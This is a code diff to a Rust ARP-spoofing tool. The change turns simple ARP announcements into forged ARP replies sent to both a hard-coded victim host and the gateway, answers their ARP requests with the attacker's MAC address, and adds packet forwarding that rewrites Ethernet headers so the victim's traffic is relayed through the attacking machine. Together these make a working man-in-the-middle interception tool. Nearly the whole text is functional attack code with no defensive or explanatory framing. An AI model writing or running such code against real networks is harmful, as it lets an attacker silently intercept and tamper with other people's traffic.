@@ -78,35 +78,59 @@ fn send_arp_spoof_packets(network_interface: &NetworkInterface, gateway_ip_addr:
     let gateway_mac_addr = retrieve_mac_address(&network_interface, gateway_ip_addr, tx, rx).expect("Could not locate gateway mac address");
     let victim_mac_addr = retrieve_mac_address(&network_interface, victim_ip_addr, tx, rx).expect("Could not locate victim mac address");
 
-    let packet = arp_packets::arp_announcement(network_interface.mac.unwrap(), victim_ip_addr);
+    let packet = arp_packets::arp_reply(network_interface.mac.unwrap(), victim_ip_addr, gateway_mac_addr, gateway_ip_addr);
     tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");
 
-    let packet = arp_packets::arp_announcement(network_interface.mac.unwrap(), gateway_ip_addr);
+    let packet = arp_packets::arp_reply(network_interface.mac.unwrap(), gateway_ip_addr, victim_mac_addr, victim_ip_addr);
     tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");
 
     let process_next_packet = |tx: &mut dyn DataLinkSender, rx: &mut dyn DataLinkReceiver| {
-        rx.next().ok().and_then(|incoming_packet| {
+        let ethernet_packet = rx.next().ok().and_then(|incoming_packet| {
             packet::ethernet::EthernetPacket::owned(incoming_packet.to_owned())
-        }).and_then(|ethernet_packet| {
-            if ethernet_packet.get_ethertype() != EtherTypes::Arp {
-                return None;
-            };
-            packet::arp::ArpPacket::owned(ethernet_packet.payload().to_owned())
-        }).and_then::<packet::arp::ArpPacket, _>(|arp_packet| {
-            if arp_packet.get_operation() == ArpOperations::Request {
-                // if the victim sends an arp request for the gateway we answer
-                if arp_packet.get_sender_proto_addr() == victim_ip_addr && arp_packet.get_target_proto_addr() == gateway_ip_addr {
-                    let packet = arp_packets::arp_reply(network_interface.mac.unwrap(), gateway_ip_addr, victim_mac_addr, victim_ip_addr);
-                    tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");
-                }
-                // if anyone sends an arp request for the victim we answer
-                else if arp_packet.get_target_proto_addr() == victim_ip_addr {
-                    let packet = arp_packets::arp_reply(network_interface.mac.unwrap(), victim_ip_addr, arp_packet.get_sender_hw_addr(), arp_packet.get_sender_proto_addr());
-                    tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");
-                };
-            };
-            None
         });
+
+        if let Some(ethernet_packet) = ethernet_packet {
+            match ethernet_packet {
+                packet if packet.get_ethertype() == EtherTypes::Arp => {
+                    packet::arp::ArpPacket::owned(packet.payload().to_owned()).and_then::<packet::arp::ArpPacket, _>(|arp_packet| {
+                        if arp_packet.get_operation() == ArpOperations::Request {
+                            // if the victim sends an arp request for the gateway we answer
+                            if arp_packet.get_sender_proto_addr() == victim_ip_addr && arp_packet.get_target_proto_addr() == gateway_ip_addr {
+                                let packet = arp_packets::arp_reply(network_interface.mac.unwrap(), gateway_ip_addr, victim_mac_addr, victim_ip_addr);
+                                tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");
+                            }
+                            // if anyone sends an arp request for the victim we answer
+                            else if arp_packet.get_target_proto_addr() == victim_ip_addr {
+                                let packet = arp_packets::arp_reply(network_interface.mac.unwrap(), victim_ip_addr, arp_packet.get_sender_hw_addr(), arp_packet.get_sender_proto_addr());
+                                tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");
+                            };
+                        };
+                        None
+                    });
+                },
+                packet if packet.get_ethertype() == EtherTypes::Ipv4 => {
+                    packet::ipv4::Ipv4Packet::owned(packet.payload().to_owned()).and_then::<packet::ipv4::Ipv4Packet,_>(|ipv4_packet| {
+                        if packet.get_source() == victim_mac_addr && packet.get_destination() == network_interface.mac.unwrap() {
+                            if let Some(mut new_packet) = packet::ethernet::MutableEthernetPacket::owned(packet.packet().to_vec()) {
+                                new_packet.set_source(network_interface.mac.unwrap());
+                                new_packet.set_destination(gateway_mac_addr);
+                                tx.send_to(new_packet.packet(), None);
+                            }
+                        }
+                        else if packet.get_source() == gateway_mac_addr && packet.get_destination() == network_interface.mac.unwrap() {
+                            if let Some(mut new_packet) = packet::ethernet::MutableEthernetPacket::owned(packet.packet().to_vec()) {
+                                new_packet.set_source(network_interface.mac.unwrap());
+                                new_packet.set_destination(victim_mac_addr);
+                                tx.send_to(new_packet.packet(), None);
+                            }
+                        }
+                        None
+                    });
+                }
+                _ => {}
+            }
+        }
+
     };
 
     let now = std::time::Instant::now();
@@ -123,6 +147,6 @@ fn main() {
     let (mut tx, mut rx) = create_channels(&interface);
 
     loop {
-        send_arp_spoof_packets(&interface, Ipv4Addr::new(192,168,0,1), Ipv4Addr::new(192,168,0,75), tx.as_mut(), rx.as_mut(), std::time::Duration::from_secs(2));
+        send_arp_spoof_packets(&interface, Ipv4Addr::new(192,168,0,1), Ipv4Addr::new(192,168,0,76), tx.as_mut(), rx.as_mut(), std::time::Duration::from_secs(10));
     }
 }
